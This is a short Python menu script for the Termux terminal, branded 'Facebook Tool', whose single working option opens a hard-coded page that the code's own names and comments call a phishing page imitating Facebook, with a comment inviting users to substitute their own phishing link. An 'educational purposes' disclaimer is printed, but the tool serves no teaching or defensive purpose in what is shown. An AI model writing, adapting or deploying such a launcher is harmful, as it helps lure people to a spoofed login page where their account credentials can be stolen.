from colorama import Fore, Style
import os

# Disclaimer
DISCLAIMER = """
This tool is developed solely for educational purposes to demonstrate security 
vulnerabilities and raise awareness about phishing attacks. Unauthorized use 
of this tool for malicious purposes is strictly prohibited and may lead to severe 
legal consequences. Use responsibly and ethically.
"""

# Tool Header
def show_header():
    print(Style.BRIGHT + Fore.RED + "=============== FACEBOOK TOOL ===============" + Style.RESET_ALL)
    print(Style.BRIGHT + Fore.BLUE + "=============== Developed By Yamman ===============" + Style.RESET_ALL)
    print(Style.BRIGHT + Fore.YELLOW + DISCLAIMER + Style.RESET_ALL)

# Tool Menu
def show_menu():
    print(Style.BRIGHT + Fore.CYAN + "\n[ MENU OPTIONS ]" + Style.RESET_ALL)
    print(Fore.GREEN + "1. Facebook (Open Page)" + Style.RESET_ALL)
    
    print(Fore.GREEN + "2. Exit" + Style.RESET_ALL)

# Open Facebook (Phishing) Page
def open_facebook():
    phishing_link = "https://webfacebook.vercel.app"  # Replace with your phishing page link
    print(Fore.YELLOW + f"Opening the Facebook page: {phishing_link}" + Style.RESET_ALL)
    os.system(f"termux-open-url {phishing_link}")

# Main Program
def main():
    show_header()
    while True:
        show_menu()
        choice = input(Fore.CYAN + "\nEnter your choice: " + Style.RESET_ALL)
        if choice == "1":
            open_facebook()
        elif choice == "2":
            print(Fore.GREEN + "Exiting tool. Stay ethical!" + Style.RESET_ALL)
            break
        else:
            print(Fore.RED + "Invalid choice, please try again!" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
